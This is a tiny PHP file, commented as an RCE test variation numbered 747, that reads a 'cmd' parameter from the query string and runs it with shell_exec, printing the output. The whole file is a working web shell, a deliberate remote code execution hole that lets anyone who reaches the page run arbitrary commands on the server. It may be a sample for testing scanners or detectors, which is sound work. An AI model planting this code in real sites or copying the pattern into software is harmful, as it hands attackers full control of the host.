<?php
// RCE test variation #747
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>